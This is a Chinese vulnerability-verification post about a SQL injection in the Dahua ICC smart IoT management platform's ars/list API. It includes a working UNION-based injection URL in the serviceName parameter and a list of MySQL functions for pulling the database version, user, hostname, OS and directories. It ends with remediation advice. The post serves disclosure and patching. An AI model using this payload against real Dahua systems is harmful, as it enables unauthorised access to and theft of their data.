#  漏洞验证-大华ICC智能物联综合管理平台 ars/list SQL注入  
原创 Domren  网安智界   2026-01-12 09:20  
  
一、漏洞描述  
  
大华ICC智能物联综合管理平台大华ICC智能物联综合管理平台 ars/list 接口存在SQL注入漏洞。恶意攻击者通过注入恶意SQL指令，可非法访问、篡改或删除数据库敏感数据，甚至通过数据库提权功能获取服务器最高控制权，导致严重的数据泄露或业务中断。  
  
二、验证POC  
  
https://XXXX/evo-apigw/evo-arsm/1.0.0/ars/list?serviceName=%27+UNION+ALL+SELECT+NULL,NULL,NULL,CONCAT(0x7e,VERSION(),0x7e),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-  
  
其他可用函数：  
  
VERSION()	数据库版本  
  
USER()	当前用户（含主机）  
  
CURRENT_USER()	当前用户  
  
DATABASE()	当前数据库名  
  
@@hostname	服务器主机名  
  
@@version_compile_os	操作系统  
  
@@datadir	数据目录	  
  
@@basedir	安装目录	  
  
@@version_compile_machine	系统架构	  
  
  
三、验证截图  
  
![](https://mmbiz.qpic.cn/mmbiz_png/4GMSIbPibVJ8DYTYMxQfib4PxuiahAXwdyyOPIYeCJ74jLuwFWvfXWF7sUicFsvWJw9qwibDPggZAu8SH3Zicg8YkHfw/640?wx_fmt=png&from=appmsg "")  
  
四、整改建议  
  
1、及时更新系统到厂商最新修复版本以修复漏洞；2、使用预编译语句（PreparedStatement）或参数化查询，强制实现数据与代码分离；3、对所有用户输入进行严格的强类型校验和白名单过滤，清洗潜在恶意字符；4、遵循最小权限原则，严格限制数据库账户的文件读写及执行系统命令权限；5、在网络边界部署Web应用防火墙（WAF）拦截恶意SQL特征，并开启数据库异常操作审计。  
  
  
